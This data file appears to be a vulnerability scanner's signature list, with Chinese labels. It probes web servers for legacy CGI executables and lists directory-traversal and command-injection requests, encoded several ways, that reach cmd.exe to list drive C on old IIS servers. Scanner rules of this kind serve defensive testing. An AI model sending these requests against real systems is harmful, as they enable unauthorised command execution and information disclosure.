+10813#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/fpexplorer.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10814#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/get16.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10815#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/imapcern.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10816#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/imapncsa.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10817#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/lsin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10818#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mailme.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10819#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mailmepro.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10820#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mailsend.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10821#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/minimal.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10822#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/post16.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10823#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/postie.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10824#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/redir.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10825#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/test.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10826#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/testcgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10827#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/wsendmail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10829#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10830#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/rguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10831#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/wguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10832#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/wwwuploader.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10833#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10834#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/rguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10835#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/wguest.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10836#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgiWebupdate.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10837#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgimail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10838#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/db2_doc/html/db2srsen.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10839#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/get32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10840#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/getdrvrs.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10841#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/imapcern.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10842#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/lsin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10843#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/newdsn.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10844#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/post16.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10845#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/s97_cgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10846#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/../../cmd.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10848#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/CWMail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10849#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/GW5/GWWEB.EXE#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10850#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/MailPost.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10851#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/blat.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10852#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/cart32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10853#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/formvar.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10854#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/fpexplorer.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10855#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/imagemap.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10856#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/mailform.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10857#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/mailme.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10858#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/mailmepro.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10859#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/mailsend.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10860#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/postie.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10862#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/test.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10863#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/tools/getdrvs.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10864#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/tools/newdns.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10865#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/toos/mkilog.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10866#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/scripts/uploader.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10867#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/webnews.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10868#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/webplus.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10869#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/win-c-sample.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10870#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/wsendmail.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10871#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/search/s97_cgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10872#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/search97/s97_cgi.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10873#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlets/jrun.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10874#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/shtml.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10875#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/stats/cgi-win/perl.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10876#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/visadmin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10877#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/webfind.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10878#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/win-c-sample.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10880#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/visadmin.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10881#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/htimage.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10883#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/ceilidh.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10884#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/post32.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+11127#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/powerup/r.pl?FILE=main.html#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+13010#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/com.livesoftware.jrun.plugins.jsp.jsp#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+13017#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/8000/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter/../../test.jsp#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+13038#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter/../../test.jsp#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+15173#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/servlet/com.livesoftware.jrun.plugins.php.php#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+16187#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cmd.exe?/c+dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+16189#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+16190#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_mem_bin/..%c0%2f../..%c0%2f../..%c0%2f../winnt/system32/cmd.exe?/c+dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+16191#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_mem_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+16192#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_mem_bin/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49318#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/_mem_bin/..%c1%9f../..%c1%9f../..%c1%9f../winnt/system32/cmd.exe?/c+dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49527#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/rightfax/fuwww.dll/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49626#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/MSADC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49627#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/MSADC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49628#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/MSADC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49629#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49630#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49631#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/PBServer/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49632#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49633#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49634#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49635#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49636#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/Rpc/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49637#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49669#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ccbil/cgibin/ibp/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49682#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/auth.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49683#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/authorizenet.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49694#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/ezshopper2/loadpage.cgi?id+/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49695#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/ezshopper3/loadpage.cgi?user_id=id&file=/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49703#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mastergate/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49705#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mtc/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49706#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/netauth.cgi?cmd=show&page=../../#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49713#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/webc.cgi/g/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49715#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/windmail.exe?%20|%20dir%20c:/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49748#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/ibp/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49757#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49771#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/dmr/add-passwd.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49778#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/iBill/mastergate/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49781#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ibill/cgi-bin/mastergate/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49786#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ibp/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49787#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/igate/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49797#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/mastergate/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49840#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/mtc/search.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49866#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/iisadmin/ism.dll?http/dir%20../../#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
+49896#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/~cgi-bin/authorizenet.cgi/#d9Fa0j#GET#d9Fa0j#403#d9Fa0j#发现可利用目录信息泄露#d9Fa0j#
